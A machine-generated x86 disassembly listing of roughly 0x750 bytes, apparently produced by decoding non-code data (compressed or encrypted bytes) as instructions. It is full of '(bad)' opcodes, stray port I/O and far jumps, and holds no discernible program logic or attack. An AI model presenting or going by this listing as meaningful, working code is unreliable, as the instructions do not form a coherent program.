  429e13:	(bad)
  429e16:	in     al,0x43
  429e18:	mov    esp,edx
  429e1a:	pop    esi
  429e1b:	inc    esp
  429e1c:	inc    ebp
  429e1d:	xchg   ecx,eax
  429e1e:	jo     0x429e4a
  429e20:	mov    ecx,0x7f02795a
  429e25:	add    BYTE PTR [eax-0xe],bl
  429e28:	jg     0x429ea7
  429e2a:	inc    ebx
  429e2b:	add    eax,0xeae78407
  429e30:	idiv   bh
  429e32:	add    BYTE PTR [eax],al
  429e34:	add    BYTE PTR [eax],al
  429e36:	add    BYTE PTR [ebx-0x391728af],ah
  429e3c:	and    al,0xf9
  429e3e:	jmp    FWORD PTR [edx]
  429e40:	sti    
  429e41:	mov    ds:0xf6eb8226,eax
  429e46:	jne    0x429eb4
  429e48:	(bad)  
  429e49:	fwait
  429e4a:	es jb  0x429e38
  429e4d:	div    BYTE PTR [ebp+0x6c]
  429e50:	(bad)  
  429e51:	xchg   ebx,eax
  429e52:	es inc edx
  429e54:	in     al,dx
  429e55:	cmp    BYTE PTR [ebp-0x78],dh
  429e58:	sbb    edx,DWORD PTR [esi+0x524cb3c0]
  429e5e:	leave  
  429e5f:	into   
  429e60:	sbb    bh,bl
  429e62:	push   esp
  429e63:	xchg   edi,eax
  429e64:	idiv   DWORD PTR [edx-0x1c]
  429e67:	and    al,0x88
  429e69:	in     al,dx
  429e6a:	sbb    BYTE PTR [edi+0x31],ch
  429e6d:	push   ecx
  429e6e:	push   edi
  429e6f:	xchg   esi,ebp
  429e71:	not    BYTE PTR ds:0x3ff814
  429e77:	push   ebp
  429e78:	pop    edi
  429e79:	pop    ds
  429e7a:	sbb    al,0x67
  429e7c:	inc    esp
  429e7d:	(bad)  
  429e7e:	mov    edx,0x65c
  429e83:	iret   
  429e84:	(bad)  
  429e85:	dec    edi
  429e86:	dec    ecx
  429e88:	push   cs
  429e89:	or     eax,DWORD PTR [eax-0x24]
  429e8c:	cli    
  429e8d:	jb     0x429e53
  429e8f:	inc    edx
  429e90:	in     al,dx
  429e91:	xor    al,0xff
  429e94:	stc    
  429e95:	xor    dh,ch
  429e97:	test   eax,0x575435
  429e9c:	add    BYTE PTR [eax],al
  429e9e:	add    BYTE PTR [eax],al
  429ea0:	pop    esi
  429ea2:	out    0xed,eax
  429ea4:	pop    ss
  429ea5:	in     al,dx
  429ea6:	test   BYTE PTR [ebp+esi*2+0x2822afe9],0xfc
  429eae:	inc    ebx
  429eaf:	push   ebx
  429eb0:	xor    eax,0x82f745b1
  429eb5:	fistp  QWORD PTR [edx-0x40]
  429eb8:	add    BYTE PTR [edx],dh
  429eba:	jp     0x429eff
  429ebc:	jns    0x429e5e
  429ebe:	jle    0x429e4c
  429ec0:	je     0x429eed
  429ec2:	jmp    DWORD PTR [edi+0x35]
  429ec5:	inc    ebp
  429ec6:	cld    
  429ec7:	jmp    FWORD PTR [edx+0x66200ff4]
  429ecd:	imul   edi,edi,0xffffff84
  429ed0:	xor    eax,0x68fb0fa0
  429ed5:	adc    edx,DWORD PTR [edx]
  429ed7:	inc    eax
  429ed8:	jne    0x429e7c
  429eda:	mov    edx,0xef039123
  429edf:	ret    
  429ee0:	sub    esp,DWORD PTR ds:0x365ef07d
  429ee6:	mov    al,0xb2
  429ee8:	pop    esi
  429ee9:	ds stc 
  429eeb:	xor    eax,0x2a
  429eee:	(bad)  
  429eef:	(bad)  
  429ef0:	(bad)  
  429ef1:	ins    DWORD PTR es:[edi],dx
  429ef2:	sbb    al,0xa5
  429ef4:	cmp    BYTE PTR [esi+0x29],bl
  429ef7:	lea    esi,[ecx-0x44b01ff1]
  429efd:	out    0xdf,eax
  429eff:	push   ss
  429f00:	jne    0x429e94
  429f02:	xchg   edi,eax
  429f03:	and    eax,DWORD PTR [eax]
  429f05:	add    BYTE PTR [eax],al
  429f07:	add    BYTE PTR [eax],al
  429f09:	cdq    
  429f0a:	jae    0x429ec3
  429f0c:	sbb    al,0x75
  429f0e:	sub    ebp,esp
  429f10:	les    ecx,FWORD PTR [ecx+0x19]
  429f13:	iret   
  429f14:	out    0xae,eax
  429f16:	dec    esi
  429f17:	sub    ebx,edi
  429f19:	neg    BYTE PTR [edi]
  429f1b:	(bad)  [ebx]
  429f1d:	jno    0x429f43
  429f1f:	xchg   ebp,eax
  429f20:	sar    cl,0x6b
  429f23:	mov    al,0x7
  429f25:	mov    dl,0x2
  429f27:	lods   eax,DWORD PTR ds:[esi]
  429f28:	fild   WORD PTR [edx+0x7503e903]
  429f2e:	fcmovnb st,st(2)
  429f30:	(bad)  
  429f31:	jg     0x429ebf
  429f33:	cwde   
  429f34:	add    al,0x75
  429f36:	add    dh,BYTE PTR [eax-0x68]
  429f39:	push   esi
  429f3a:	cli    
  429f3b:	ins    DWORD PTR es:[edi],dx
  429f3c:	shl    DWORD PTR [esi+0x2a],0xf4
  429f40:	mov    ebp,0x44651d72
  429f45:	jle    0x429ecd
  429f47:	test   BYTE PTR [esi*2+0x5a0a6e02],al
  429f4e:	mov    ecx,0xc1000bcc
  429f53:	loopne 0x429f28
  429f55:	push   edx
  429f56:	shr    DWORD PTR [esi],1
  429f58:	sub    bh,BYTE PTR [esi]
  429f5a:	xchg   BYTE PTR [ecx],ch
  429f5c:	scas   eax,DWORD PTR es:[edi]
  429f5d:	xlat   BYTE PTR ds:[ebx]
  429f5e:	mov    ch,BYTE PTR [ebp+0x6d8284df]
  429f64:	fild   WORD PTR [edx+eax*1-0x3b05f4a5]
  429f6b:	in     al,0x7c
  429f6d:	add    BYTE PTR [eax],al
  429f6f:	add    BYTE PTR [eax],al
  429f71:	add    ch,dh
  429f73:	(bad)  
  429f74:	call   0x60ed147c
  429f79:	adc    al,0x75
  429f7b:	add    bl,BYTE PTR [ecx]
  429f7d:	sub    DWORD PTR [eax-0x1e],ebp
  429f80:	aad    0xc3
  429f82:	cli    
  429f83:	test   DWORD PTR [ecx+0x2289aeaf],ebp
  429f89:	add    dl,dh
  429f8b:	mov    DWORD PTR [ecx+0x2],ebp
  429f8e:	jne    0x429f92
  429f90:	outs   dx,BYTE PTR ds:[esi]
  429f91:	mov    edi,0x2fee296
  429f96:	inc    edx
  429f97:	sub    al,dl
  429f99:	xchg   ecx,eax
  429f9a:	iret   
  429f9b:	sbb    al,0x6c
  429f9d:	inc    ebx
  429f9e:	cmp    al,0xf4
  429fa0:	nop
  429fa1:	inc    ebp
  429fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fa3:	sbb    eax,DWORD PTR [eax]
  429fa5:	jbe    0x429fd9
  429fa7:	inc    edx
  429fa8:	je     0x429f7d
  429faa:	pop    esp
  429fab:	(bad)  
  429fac:	and    edi,edi
  429fae:	neg    BYTE PTR [ebp-0x516408dd]
  429fb4:	scas   al,BYTE PTR es:[edi]
  429fb5:	inc    edx
  429fb6:	mov    esp,DWORD PTR [esp+edx*1]
  429fb9:	das    
  429fba:	pop    ebp
  429fbb:	sbb    DWORD PTR [ecx+0x444282aa],ecx
  429fc1:	add    eax,0xb5800364
  429fc6:	push   edx
  429fc7:	repnz add al,0xb4
  429fca:	jp     0x429f4f
  429fcc:	lds    esi,FWORD PTR [edx-0x64]
  429fcf:	sub    ch,BYTE PTR [esi+eiz*1-0x74]
  429fd3:	pop    ss
  429fd4:	dec    ebp
  429fd5:	push   0x0
  429fd7:	add    BYTE PTR [eax],al
  429fd9:	add    BYTE PTR [eax],al
  429fdb:	jmp    0x23c6:0xb4d117df
  429fe2:	fidiv  WORD PTR [edi-0x65]
  429fe5:	inc    ebx
  429fe6:	lds    ebp,FWORD PTR [esi-0x26]
  429fe9:	inc    esp
  429fea:	mov    dl,0xc
  429fec:	add    BYTE PTR [ebx],cl
  429fee:	pop    ebp
  429fef:	inc    ecx
  429ff0:	sbb    ebx,edi
  429ff2:	out    0x9e,al
  429ff4:	mov    bh,0x3
  429ff6:	push   ebx
  429ff7:	ja     0x429fa9
  429ff9:	out    0x16,eax
  429ffb:	rcr    DWORD PTR [ebx],1
  429ffd:	sti    
  429ffe:	gs mov cl,0x96
  42a001:	add    al,0xaf
  42a003:	xor    eax,0x7e812e0
  42a008:	xor    eax,0xf0d51538
  42a00d:	jae    0x429ff5
  42a00f:	outs   dx,DWORD PTR ds:[esi]
  42a010:	dec    eax
  42a011:	call   0xfb5ad62d
  42a016:	jb     0x42a033
  42a018:	add    BYTE PTR [edi-0x6f],bh
  42a01b:	(bad)  
  42a01c:	sahf   
  42a01d:	ss push 0xffffff99
  42a020:	stc    
  42a021:	jl     0x42a023
  42a023:	mov    ebx,fs
  42a025:	adc    al,0x8
  42a027:	lahf   
  42a028:	aas    
  42a029:	sti    
  42a02a:	sub    ah,BYTE PTR [eax+0x22]
  42a02d:	pop    ss
  42a02e:	cmp    eax,0xa3d71c
  42a033:	ret    0x5134
  42a036:	push   edi
  42a037:	mov    BYTE PTR [eax],0x58
  42a03a:	call   0x3989f3
  42a03f:	add    BYTE PTR [eax],al
  42a041:	add    BYTE PTR [eax],al
  42a043:	add    BYTE PTR [eax],dl
  42a045:	(bad)  
  42a046:	je     0x42a05f
  42a048:	fisttp WORD PTR [edx+ebp*1-0x40]
  42a04c:	and    al,0x47
  42a04e:	cmc    
  42a04f:	jmp    FWORD PTR [ebx+0x5675c082]
  42a055:	xor    BYTE PTR [esi+0x6a],cl
  42a058:	dec    esi
  42a059:	inc    edi
  42a05a:	jecxz  0x42a0a9
  42a05c:	xchg   esi,eax
  42a05d:	jecxz  0x42a055
  42a05f:	call   DWORD PTR [ecx+0x17]
  42a062:	or     al,BYTE PTR [eax+0x5c]
  42a065:	sahf   
  42a066:	inc    ebx
  42a067:	and    al,0x58
  42a069:	in     al,0x2d
  42a06b:	call   0x3bc312
  42a070:	adc    dh,bh
  42a072:	(bad)  
  42a073:	and    al,0x1a
  42a075:	in     al,0x82
  42a077:	inc    edi
  42a078:	adc    BYTE PTR [edx],al
  42a07a:	nop
  42a07b:	add    DWORD PTR [edi+edi*8],ecx
  42a07e:	dec    edi
  42a07f:	call   DWORD PTR [ecx]
  42a081:	pop    es
  42a082:	or     eax,DWORD PTR [eax+0x1c]
  42a085:	cwde   
  42a086:	ds add al,0x87
  42a089:	jg     0x42a017
  42a08b:	add    DWORD PTR [edi+edi*8],ecx
  42a08e:	addr16 inc eax
  42a090:	mov    bl,0x7
  42a092:	add    BYTE PTR [eax+0x1b],dl
  42a095:	repnz pop ds
  42a097:	adc    ecx,DWORD PTR [esi+eax*1-0x7e343f7b]
  42a09e:	out    dx,al
  42a09f:	std    
  42a0a0:	jne    0x42a116
  42a0a2:	and    ah,bh
  42a0a4:	jns    0x42a046
  42a0a6:	mov    ecx,0x3
  42a0ab:	add    BYTE PTR [eax],al
  42a0ad:	jbe    0x42a117
  42a0af:	iret   
  42a0b0:	cli    
  42a0b1:	pusha  
  42a0b2:	and    DWORD PTR [esi],ecx
  42a0b4:	inc    eax
  42a0b5:	jne    0x42a0ab
  42a0b7:	rcr    DWORD PTR [esi+ecx*2-0x60],0x1f
  42a0bc:	pop    ebp
  42a0bd:	mov    dh,0x2e
  42a0bf:	xlat   BYTE PTR ds:[ebx]
  42a0c0:	addr16 sbb eax,0x9affbe38
  42a0c6:	jo     0x42a0f1
  42a0c8:	add    BYTE PTR [ebp-0x60],dh
  42a0cb:	scas   eax,DWORD PTR es:[edi]
  42a0cc:	pop    es
  42a0cd:	inc    esi
  42a0ce:	loopne 0x42a0b6
  42a0d0:	sbb    al,0xf5
  42a0d2:	cmc    
  42a0d3:	mov    ebp,0x621ae9ff
  42a0d8:	enter  0x6d40,0xff
  42a0dc:	push   edx
  42a0dd:	bound  edx,QWORD PTR [edi]
  42a0df:	or     ecx,DWORD PTR [edi]
  42a0e1:	mov    ch,0x2b
  42a0e3:	out    0x1c,eax
  42a0e5:	cmc    
  42a0e6:	(bad)  
  42a0e7:	mov    ebp,0x1711c1ff
  42a0ec:	shl    BYTE PTR [edi+0x2b],cl
  42a0ef:	inc    DWORD PTR [ebx-0x77086fcb]
  42a0f5:	nop
  42a0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0f7:	dec    edi
  42a0f8:	aas    
  42a0f9:	jne    0x42a0dc
  42a0fb:	(bad)  
  42a0fc:	jg     0x42a146
  42a0fe:	in     eax,dx
  42a0ff:	add    eax,DWORD PTR [ecx]
  42a101:	ret    0xb38
  42a104:	sbb    BYTE PTR [esi-0x15],ah
  42a107:	add    ecx,DWORD PTR [ecx+0x457347a8]
  42a10d:	sub    eax,0x1e1bfc
  42a112:	add    BYTE PTR [eax],al
  42a114:	add    BYTE PTR [eax],al
  42a116:	aad    0x2b
  42a118:	dec    DWORD PTR [eax+edi*1+0x60fad463]
  42a11f:	aaa    
  42a120:	pop    ss
  42a121:	and    bh,bh
  42a123:	add    ch,cl
  42a125:	add    ebp,esp
  42a127:	add    BYTE PTR [esi+0x2942a3f6],cl
  42a12d:	inc    ecx
  42a12e:	repnz lahf 
  42a130:	xor    cl,0xab
  42a133:	(bad)  
  42a134:	cld    
  42a135:	sti    
  42a136:	in     eax,dx
  42a137:	clc    
  42a138:	gs mov bh,0xae
  42a13b:	sbb    DWORD PTR [esi-0x260793bd],esi
  42a141:	mov    ?,WORD PTR [ebp+0x7529de2a]
  42a147:	add    ah,BYTE PTR [edi]
  42a149:	cld    
  42a14a:	xchg   edx,eax
  42a14b:	stos   DWORD PTR es:[edi],eax
  42a14c:	loopne 0x42a0e9
  42a14e:	mov    ds:0x8d03a594,al
  42a153:	sar    DWORD PTR [esi],cl
  42a155:	add    al,0x75
  42a157:	test   esp,eax
  42a159:	daa    
  42a15a:	jne    0x42a0e9
  42a15c:	lods   al,BYTE PTR ds:[esi]
  42a15d:	sti    
  42a15e:	outs   dx,DWORD PTR ds:[esi]
  42a15f:	rol    BYTE PTR [eax-0x43],cl
  42a162:	or     BYTE PTR [edx],al
  42a164:	jmp    0x29181781
  42a169:	les    edx,FWORD PTR [ebx]
  42a16b:	lea    ecx,[ebx+ebx*1+0x250cc7ca]
  42a172:	cli    
  42a173:	mov    esi,0x29580f0
  42a178:	adc    DWORD PTR [esi+0x0],edi
  42a17e:	add    BYTE PTR [eax],ch
  42a180:	add    ch,cl
  42a182:	inc    ecx
  42a183:	jno    0x42a187
  42a185:	jg     0x42a17e
  42a187:	call   0xdd21:0x1ac1574a
  42a18e:	sub    dh,BYTE PTR [ebp+0x2]
  42a191:	data16 sahf 
  42a193:	push   cs
  42a194:	add    bl,BYTE PTR [esi-0x42]
  42a197:	jp     0x42a1b2
  42a199:	stc    
  42a19a:	sbb    ebp,DWORD PTR [ebx]
  42a19c:	mov    cl,ch
  42a19e:	add    edi,esp
  42a1a0:	mov    esi,0xc8dccff
  42a1a5:	das    
  42a1a6:	test   eax,0xc8757b6
  42a1ab:	jns    0x42a1f2
  42a1ad:	inc    ebp
  42a1ae:	test   esi,edi
  42a1b0:	sbb    al,0xfb
  42a1b2:	xchg   esi,eax
  42a1b3:	cmc    
  42a1b4:	(bad)  
  42a1b5:	sti    
  42a1b6:	mov    ?,WORD PTR ds:0xbc91e3bf
  42a1bc:	push   cs
  42a1bd:	add    cl,ch
  42a1bf:	xor    al,0xfe
  42a1c1:	inc    DWORD PTR [edx]
  42a1c3:	lods   eax,DWORD PTR ds:[esi]
  42a1c4:	mov    al,ds:0x18b5fbb7
  42a1c9:	jecxz  0x42a1f4
  42a1cb:	dec    edi
  42a1cc:	add    al,BYTE PTR [eax]
  42a1ce:	push   0xfffffff3
  42a1d0:	sbb    al,0x0
  42a1d2:	(bad)  
  42a1d3:	retf   
  42a1d4:	add    bl,bh
  42a1d6:	sbb    DWORD PTR [ecx+0x4],esp
  42a1d9:	mov    ebp,ecx
  42a1db:	jbe    0x42a168
  42a1dd:	inc    ebp
  42a1de:	inc    ebp
  42a1df:	lea    ecx,[edi+ebp*1]
  42a1e2:	sub    DWORD PTR [eax],eax
  42a1e4:	add    BYTE PTR [eax],al
  42a1e6:	add    BYTE PTR [eax],al
  42a1e8:	ss pop ecx
  42a1ea:	xchg   esp,eax
  42a1ec:	jle    0x42a231
  42a1ee:	inc    ebp
  42a1ef:	or     eax,0x1efb1bee
  42a1f4:	cmc    
  42a1f5:	(bad)  
  42a1f8:	int    0xbd
  42a1fa:	jecxz  0x42a1fd
  42a1fc:	mov    BYTE PTR [ecx],bl
  42a1fe:	add    cl,ch
  42a200:	mov    ah,0xfe
  42a202:	call   DWORD PTR [edx+0x7ba7a00e]
  42a208:	xor    eax,0x4f65e318
  42a20d:	add    al,BYTE PTR [eax]
  42a20f:	jb     0x42a20d
  42a211:	or     ebp,DWORD PTR [edi]
  42a213:	fiadd  WORD PTR [eax]
  42a215:	xchg   esi,eax
  42a216:	sti    
  42a217:	ds into 
  42a219:	mov    ah,0x52
  42a21b:	ss mov esi,0x84004586
  42a221:	dec    esi
  42a222:	add    BYTE PTR [ebp-0x1c],0xe4
  42a226:	das    
  42a227:	call   0x4313ec
  42a22c:	push   ebp
  42a22d:	dec    ecx
  42a22e:	fild   WORD PTR [ebx-0x14091d5f]
  42a234:	retf   0xbb30
  42a237:	inc    eax
  42a238:	pop    ds
  42a239:	mov    BYTE PTR [ebp-0x18],ah
  42a23c:	jbe    0x42a1d4
  42a23e:	push   edi
  42a23f:	mov    DWORD PTR [ecx+0x304d7aea],ecx
  42a245:	jecxz  0x42a271
  42a247:	call   DWORD PTR [edi]
  42a249:	jns    0x42a252
  42a24b:	cmp    eax,DWORD PTR [eax]
  42a24d:	add    BYTE PTR [eax],al
  42a24f:	add    BYTE PTR [eax],al
  42a251:	fcomi  st,st(3)
  42a253:	test   BYTE PTR [eax+0x3b00038c],bl
  42a259:	sub    esi,ebx
  42a25b:	or     DWORD PTR [esi+0x6a00039c],0x64
  42a262:	pop    ebx
  42a263:	push   ecx
  42a264:	call   FWORD PTR [ecx+0x5c401143]
  42a26a:	add    ah,0xc
  42a26d:	cmp    cl,BYTE PTR [eax-0x79c577bb]
  42a273:	(bad)  
  42a274:	gs out 0x49,eax
  42a277:	xchg   DWORD PTR [esi-0x3b],esp
  42a27a:	dec    esp
  42a27b:	std    
  42a27c:	xlat   BYTE PTR gs:[ebx]
  42a27e:	dec    ecx
  42a27f:	mov    esp,DWORD PTR [esi-0x2b]
  42a282:	dec    esp
  42a283:	jmp    DWORD PTR [ebp-0x39]
  42a286:	dec    ecx
  42a287:	(bad)  
  42a288:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42a28a:	dec    esp
  42a28b:	add    DWORD PTR [ebx+0x468896d9],ecx
  42a291:	adc    al,0x88
  42a293:	inc    ebp
  42a294:	mov    al,ds:0x8b0b49a5
  42a299:	pop    ecx
  42a29a:	stos   BYTE PTR es:[edi],al
  42a29b:	mov    BYTE PTR [esi+0x75],al
  42a29e:	adc    eax,0xa1cd458a
  42a2a3:	enter  0xee17,0xe5
  42a2a7:	outs   dx,DWORD PTR ds:[esi]
  42a2a8:	mov    DWORD PTR [ebx],edi
  42a2aa:	xor    eax,0x993086a9
  42a2af:	test   al,0x88
  42a2b1:	cmp    ecx,DWORD PTR [ecx]
  42a2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2b4:	xchg   BYTE PTR [eax],al
  42a2b6:	add    BYTE PTR [eax],al
  42a2b8:	add    BYTE PTR [eax],al
  42a2ba:	xor    BYTE PTR [ebp+0x4b3b88a8],dh
  42a2c0:	test   eax,0xa8b13086
  42a2c5:	mov    BYTE PTR [ebx],bh
  42a2c7:	cmp    eax,0xbd3086a9
  42a2cc:	test   al,0x88
  42a2ce:	cmp    edi,DWORD PTR [edi]
  42a2d0:	test   eax,0xa9693086
  42a2d5:	mov    BYTE PTR [ebx],bh
  42a2d7:	inc    ecx
  42a2d8:	mov    al,BYTE PTR [ebp-0x4f]
  42a2db:	xchg   ecx,eax
  42a2dc:	enter  0xfe2b,0x5d
  42a2e0:	ja     0x42a319
  42a2e2:	mov    dl,0x34
  42a2e4:	push   cs
  42a2e5:	jg     0x42a2a2
  42a2e7:	clc    
  42a2e8:	mov    ch,0x4f
  42a2ea:	mov    ah,0xb0
  42a2ec:	out    dx,al
  42a2ed:	dec    edi
  42a2ee:	jb     0x42a31f
  42a2f0:	push   edi
  42a2f1:	adc    DWORD PTR [ebp+0x4dbfd22b],esi
  42a2f7:	add    eax,0xe9750017
  42a2fc:	push   es
  42a2fd:	add    bh,bl
  42a2ff:	daa    
  42a300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a301:	xchg   edi,eax
  42a302:	(bad)  
  42a303:	push   0xf3e8e7ff
  42a308:	(bad)  
  42a309:	push   esi
  42a30b:	xchg   BYTE PTR [ebx],bl
  42a30d:	add    BYTE PTR [edi+0x7d458a2b],bl
  42a313:	or     al,0xce
  42a315:	out    0xac,eax
  42a317:	mov    al,0xfe
  42a319:	(bad)  
  42a31a:	in     al,dx
  42a31b:	add    ch,BYTE PTR [eax+ebp*1]
  42a31e:	add    BYTE PTR [eax],al
  42a320:	add    BYTE PTR [eax],al
  42a322:	add    BYTE PTR [edx],bl
  42a324:	add    eax,0x41b54416
  42a329:	pop    esi
  42a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a32b:	sbb    bh,BYTE PTR [esi]
  42a32d:	and    al,0x28
  42a32f:	fst    QWORD PTR ds:0xc77221c2
  42a335:	mov    esp,0xccbff221
  42a33a:	sub    al,0x14
  42a33c:	sbb    ebp,ecx
  42a33e:	add    ebx,DWORD PTR [ebx]
  42a340:	(bad)  
  42a341:	call   0x70ed21f3
  42a346:	xchg   esi,eax
  42a347:	mov    eax,DWORD PTR [edx]
  42a349:	cmp    DWORD PTR [ecx-0x7b16fd36],0x8ce91650
  42a353:	cmp    BYTE PTR [edx],cl
  42a355:	jp     0x42a32b
  42a357:	xchg   edx,eax
  42a358:	not    DWORD PTR [ebp+0x4]
  42a35b:	jne    0x42a2e8
  42a35d:	and    al,0x28
  42a35f:	xchg   edx,eax
  42a360:	add    al,0x16
  42a362:	inc    esp
  42a363:	xor    eax,0x92a76e41
  42a368:	cmp    eax,0x15dd27ac
  42a36d:	dec    edx
  42a36e:	and    edx,edi
  42a370:	mov    BYTE PTR [ecx+eiz*1-0x6],0xbe
  42a375:	inc    esp
  42a376:	sub    al,0xd0
  42a378:	sbb    ch,cl
  42a37a:	add    esp,DWORD PTR [ebx]
  42a37c:	(bad)  
  42a37d:	call   0xa0ed122f
  42a382:	xchg   ebp,eax
  42a383:	xchg   ebx,eax
  42a384:	add    dl,BYTE PTR [ecx]
  42a386:	std    
  42a387:	add    BYTE PTR [eax],al
  42a389:	add    BYTE PTR [eax],al
  42a38b:	add    BYTE PTR [edx+0x2],al
  42a38e:	jmp    0xe9597c17
  42a393:	and    al,al
  42a395:	repnz add DWORD PTR [edi+0xba4897e],edx
  42a39c:	cs sar bh,cl
  42a39f:	add    BYTE PTR [eax],dh
  42a3a1:	test   DWORD PTR [eax],eax
  42a3a3:	jmp    0xf2bae59b
  42a3a8:	add    edi,eax
  42a3aa:	adc    esi,DWORD PTR [eax+0x77]
  42a3ad:	xchg   ebp,eax
  42a3ae:	fs int 0x76
  42a3b1:	sbb    eax,0x2133600f
  42a3b6:	out    0xf7,eax
  42a3b8:	leave  
  42a3b9:	push   esp
  42a3ba:	inc    eax
  42a3bb:	stos   BYTE PTR es:[edi],al
  42a3bc:	stc    
  42a3bd:	sahf   
  42a3be:	out    0xae,eax
  42a3c0:	mov    ebx,0x95ae9820
  42a3c5:	sbb    DWORD PTR [edi+0x34],edi
  42a3c8:	xchg   ebp,eax
  42a3c9:	sbb    DWORD PTR [edi+0x142a9d24],eax
  42a3cf:	xchg   ecx,eax
  42a3d0:	jbe    0x42a3d4
  42a3d2:	mov    esi,0x447d76f9
  42a3d7:	int    0x7e
  42a3d9:	or     DWORD PTR [ebx+0x50089d25],ebp
  42a3df:	add    edi,0x316ef9e1
  42a3e5:	sbb    DWORD PTR [ebp+ecx*1-0x7f],esi
  42a3e9:	sub    al,BYTE PTR [ebx+0x8]
  42a3ec:	push   edi
  42a3ed:	sbb    DWORD PTR [edi+0x2e],edi
  42a3f3:	add    BYTE PTR [eax],al
  42a3f5:	jnp    0x42a44d
  42a3f7:	fld    TBYTE PTR [edx-0x5486bf8a]
  42a3fd:	jbe    0x42a43e
  42a3ff:	add    eax,0xffd3b529
  42a404:	push   ds
  42a405:	call   ebp
  42a407:	(bad)  
  42a408:	js     0x42a481
  42a40a:	push   ebx
  42a40b:	in     ax,0x20
  42a40e:	cld    
  42a40f:	cli    
  42a410:	aam    0x66
  42a412:	cmp    al,0x3f
  42a414:	jmp    0xfc1691ae
  42a419:	ss adc al,0x84
  42a41c:	add    BYTE PTR [ebx+ebp*2+0xd],bl
  42a420:	cmp    esp,0x27
  42a423:	sti    
  42a424:	(bad)  
  42a425:	int3   
  42a426:	pop    ds
  42a427:	sar    DWORD PTR [ecx-0x32],0xff
  42a42b:	mov    esi,0x78cc8040
  42a430:	inc    edx
  42a431:	sbb    al,0xc1
  42a433:	add    BYTE PTR [esi],0x91
  42a436:	mov    esi,0x44972573
  42a43b:	dec    DWORD PTR [eax-0x50]
  42a43e:	pop    es
  42a43f:	dec    ecx
  42a440:	jne    0x42a41c
  42a442:	dec    edi
  42a443:	jecxz  0x42a452
  42a445:	or     eax,0xd2eaffff
  42a44a:	dec    edi
  42a44b:	jecxz  0x42a402
  42a44d:	stc    
  42a44e:	(bad)  
  42a44f:	(bad)  
  42a450:	(bad)  
  42a451:	mov    ds:0xea20e3e7,al
  42a456:	repz jp 0x42a47f
  42a459:	add    BYTE PTR [eax],al
  42a45b:	add    BYTE PTR [eax],al
  42a45d:	add    ah,cl
  42a45f:	sbb    BYTE PTR [esi+0x4],0x9c
  42a463:	rcl    BYTE PTR [ebx+ecx*4-0x8],0x7f
  42a468:	in     al,dx
  42a469:	or     al,0xf
  42a46b:	imul   ebp,edi,0xf3690f00
  42a471:	add    dl,dl
  42a473:	dec    esp
  42a474:	cmp    al,0x24
  42a477:	mov    esi,?
  42a479:	jmp    FWORD PTR [ebx]
  42a47b:	xchg   eax,esi
  42a47d:	test   DWORD PTR [edx],esp
  42a47f:	jp     0x42a4c6
  42a481:	push   0x74
  42a483:	data16 fwait
  42a485:	jae    0x42a4a3
  42a487:	jmp    DWORD PTR [ecx-0xf]
  42a48a:	add    ah,bh
  42a48c:	xchg   ecx,eax
  42a48d:	stos   BYTE PTR es:[edi],al
  42a48e:	dec    esp
  42a48f:	inc    DWORD PTR [eax+eax*8+0x45822df1]
  42a496:	inc    esp
  42a497:	xchg   dh,bh
  42a499:	mov    dh,BYTE PTR [ebp+0x66]
  42a49c:	or     ecx,DWORD PTR [ecx+0x45861db3]
  42a4a2:	test   DWORD PTR [edx+0x1bfe0bc1],edx
  42a4a8:	test   eax,0x98a2cb03
  42a4ad:	repz xor bl,BYTE PTR [esi+0x17]
  42a4b1:	(bad)  
  42a4b2:	adc    ch,BYTE PTR [ecx]
  42a4b4:	dec    DWORD PTR [eax+0x2a2719b3]
  42a4ba:	shr    DWORD PTR [eax],1
  42a4bc:	inc    DWORD PTR [esi+0xb8c0dab]
  42a4c2:	add    BYTE PTR [eax],al
  42a4c4:	add    BYTE PTR [eax],al
  42a4c6:	add    dh,bh
  42a4c8:	inc    eax
  42a4c9:	or     DWORD PTR es:[ebx+0x31],eax
  42a4cd:	cwde   
  42a4ce:	pop    ds
  42a4cf:	jecxz  0x42a51c
  42a4d1:	test   eax,0x97b63afb
  42a4d6:	repz fld QWORD PTR [esi]
  42a4d9:	sbb    edi,ebx
  42a4db:	retf   0x418f
  42a4de:	pop    ebx
  42a4df:	and    esp,DWORD PTR [edx+0x41]
  42a4e2:	or     al,0x75
  42a4e4:	imul   eax,ebx,0x23
  42a4e7:	jns    0x42a513
  42a4e9:	mov    ch,0x86
  42a4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4ec:	pop    ebx
  42a4ed:	add    eax,0x3e9216c
  42a4f2:	je     0x42a567
  42a4f4:	jmp    0x42a521
  42a4f6:	dec    esp
  42a4f7:	push   ebp
  42a4f8:	fwait
  42a4f9:	sbb    DWORD PTR [edi+0x44152b3],eax
  42a4ff:	jne    0x42a555
  42a501:	nop
  42a502:	inc    edx
  42a503:	jno    0x42a55e
  42a505:	sbb    dl,BYTE PTR ds:0xffbf2b35
  42a50b:	inc    ebx
  42a50d:	xchg   ebx,edi
  42a50f:	call   0xe2352d3b
  42a514:	and    eax,DWORD PTR [esi-0x17fd20fe]
  42a51a:	mov    bh,BYTE PTR [edi]
  42a51c:	adc    bh,cl
  42a51e:	mov    dh,BYTE PTR [esi]
  42a520:	mov    dl,0x25
  42a522:	push   cs
  42a523:	push   es
  42a524:	inc    ebx
  42a525:	pop    esp
  42a526:	pop    es
  42a527:	cmp    BYTE PTR [ebx],dl
  42a529:	cwde   
  42a52a:	ret    
  42a52b:	add    BYTE PTR [eax],al
  42a52d:	add    BYTE PTR [eax],al
  42a52f:	add    BYTE PTR [edx],ch
  42a531:	aad    0x16
  42a533:	shr    BYTE PTR ds:0x18b3ada9,cl
  42a539:	xchg   ebp,eax
  42a53a:	iret   
  42a53b:	mov    ch,0xfb
  42a53d:	mov    dl,0xec
  42a53f:	or     al,0xc6
  42a541:	adc    ebp,DWORD PTR [edi-0x8]
  42a544:	push   eax
  42a545:	aam    0xf8
  42a547:	shl    DWORD PTR ds:0xacf860c4,1
  42a54d:	test   al,0xfd
  42a54f:	retf   
  42a550:	call   0x700174e8
  42a555:	pop    ecx
  42a556:	sub    DWORD PTR [edx],eax
  42a558:	mov    bh,0x6
  42a55a:	icebp  
  42a55b:	add    edx,DWORD PTR [edx]
